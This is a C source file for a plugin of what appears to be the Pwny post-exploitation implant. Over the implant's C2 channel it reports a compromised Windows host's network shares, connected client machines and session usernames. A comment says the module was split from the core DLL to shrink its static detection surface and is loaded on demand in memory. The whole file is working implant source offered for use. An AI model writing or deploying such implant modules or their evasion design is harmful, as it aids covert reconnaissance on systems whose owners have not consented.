/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Net share tab plugin — enumerate network shares and sessions.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <lm.h>
#include <string.h>
#include <pwny/c2.h>
#include <pwny/log.h>

/* Local copy of wchar_to_utf8 — the core misc.c is not linked into plugins */
static char *wchar_to_utf8(const wchar_t *in)
{
    char *out;
    int len;

    if (in == NULL)
        return NULL;

    len = WideCharToMultiByte(CP_UTF8, 0, in, -1, NULL, 0, NULL, NULL);
    if (len <= 0)
        return NULL;

    out = calloc(len, sizeof(char));
    if (out == NULL)
        return NULL;

    if (WideCharToMultiByte(CP_UTF8, 0, in, -1, out, len, NULL, FALSE) == 0)
    {
        free(out);
        out = NULL;
    }

    return out;
}

#define NETSHARE_BASE 24

#define NETSHARE_ENUM \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NETSHARE_BASE, \
                       API_CALL)

#define NETSESSION_ENUM \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       NETSHARE_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_SHARE_NAME    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE)
#define TLV_TYPE_SHARE_PATH    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 1)
#define TLV_TYPE_SHARE_REMARK  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 2)
#define TLV_TYPE_SHARE_TYPE    TLV_TYPE_CUSTOM(TLV_TYPE_INT, NETSHARE_BASE, API_TYPE)
#define TLV_TYPE_SHARE_GROUP   TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, NETSHARE_BASE, API_TYPE)

#define TLV_TYPE_SESSION_CLIENT TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 3)
#define TLV_TYPE_SESSION_USER   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 4)
#define TLV_TYPE_SESSION_TIME   TLV_TYPE_CUSTOM(TLV_TYPE_INT, NETSHARE_BASE, API_TYPE + 1)
#define TLV_TYPE_SESSION_IDLE   TLV_TYPE_CUSTOM(TLV_TYPE_INT, NETSHARE_BASE, API_TYPE + 2)
#define TLV_TYPE_SESSION_GROUP  TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, NETSHARE_BASE, API_TYPE + 1)

static const char *share_type_name(DWORD type)
{
    switch (type & 0x0FFFFFFF)
    {
        case STYPE_DISKTREE:  return "Disk";
        case STYPE_PRINTQ:    return "Printer";
        case STYPE_DEVICE:    return "Device";
        case STYPE_IPC:       return "IPC";
        default:              return "Unknown";
    }
}

static tlv_pkt_t *netshare_enum(c2_t *c2)
{
    PSHARE_INFO_2 pBuf = NULL;
    PSHARE_INFO_2 pEntry;
    NET_API_STATUS status;
    DWORD entriesRead = 0;
    DWORD totalEntries = 0;
    DWORD resumeHandle = 0;
    DWORD i;
    tlv_pkt_t *result;

    status = NetShareEnum(NULL, 2, (LPBYTE *)&pBuf,
                          MAX_PREFERRED_LENGTH,
                          &entriesRead, &totalEntries,
                          &resumeHandle);

    if (status != NERR_Success && status != ERROR_MORE_DATA)
    {
        log_debug("* netshare_enum: NetShareEnum failed (%lu)\n", status);
        if (pBuf != NULL)
        {
            NetApiBufferFree(pBuf);
        }
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < entriesRead; i++)
    {
        tlv_pkt_t *entry;
        char *name_utf8;
        char *path_utf8;
        char *remark_utf8;

        pEntry = &pBuf[i];
        entry = tlv_pkt_create();

        name_utf8 = wchar_to_utf8(pEntry->shi2_netname);
        if (name_utf8)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_SHARE_NAME, name_utf8);
            free(name_utf8);
        }

        path_utf8 = wchar_to_utf8(pEntry->shi2_path);
        if (path_utf8)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_SHARE_PATH, path_utf8);
            free(path_utf8);
        }

        remark_utf8 = wchar_to_utf8(pEntry->shi2_remark);
        if (remark_utf8)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_SHARE_REMARK, remark_utf8);
            free(remark_utf8);
        }

        tlv_pkt_add_u32(entry, TLV_TYPE_SHARE_TYPE,
                         (int32_t)pEntry->shi2_type);

        tlv_pkt_add_tlv(result, TLV_TYPE_SHARE_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    if (pBuf != NULL)
    {
        NetApiBufferFree(pBuf);
    }

    return result;
}

static tlv_pkt_t *netsession_enum(c2_t *c2)
{
    PSESSION_INFO_10 pBuf = NULL;
    PSESSION_INFO_10 pEntry;
    NET_API_STATUS status;
    DWORD entriesRead = 0;
    DWORD totalEntries = 0;
    DWORD resumeHandle = 0;
    DWORD i;
    tlv_pkt_t *result;

    status = NetSessionEnum(NULL, NULL, NULL, 10,
                            (LPBYTE *)&pBuf,
                            MAX_PREFERRED_LENGTH,
                            &entriesRead, &totalEntries,
                            &resumeHandle);

    if (status != NERR_Success && status != ERROR_MORE_DATA)
    {
        log_debug("* netsession_enum: NetSessionEnum failed (%lu)\n", status);
        if (pBuf != NULL)
        {
            NetApiBufferFree(pBuf);
        }
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < entriesRead; i++)
    {
        tlv_pkt_t *entry;
        char *client_utf8;
        char *user_utf8;

        pEntry = &pBuf[i];
        entry = tlv_pkt_create();

        client_utf8 = wchar_to_utf8(pEntry->sesi10_cname);
        if (client_utf8)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_SESSION_CLIENT, client_utf8);
            free(client_utf8);
        }

        user_utf8 = wchar_to_utf8(pEntry->sesi10_username);
        if (user_utf8)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_SESSION_USER, user_utf8);
            free(user_utf8);
        }

        tlv_pkt_add_u32(entry, TLV_TYPE_SESSION_TIME,
                         (int32_t)pEntry->sesi10_time);
        tlv_pkt_add_u32(entry, TLV_TYPE_SESSION_IDLE,
                         (int32_t)pEntry->sesi10_idle_time);

        tlv_pkt_add_tlv(result, TLV_TYPE_SESSION_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    if (pBuf != NULL)
    {
        NetApiBufferFree(pBuf);
    }

    return result;
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, NETSHARE_ENUM, (api_t)netshare_enum);
    api_call_register(api_calls, NETSESSION_ENUM, (api_t)netsession_enum);
}

#endif
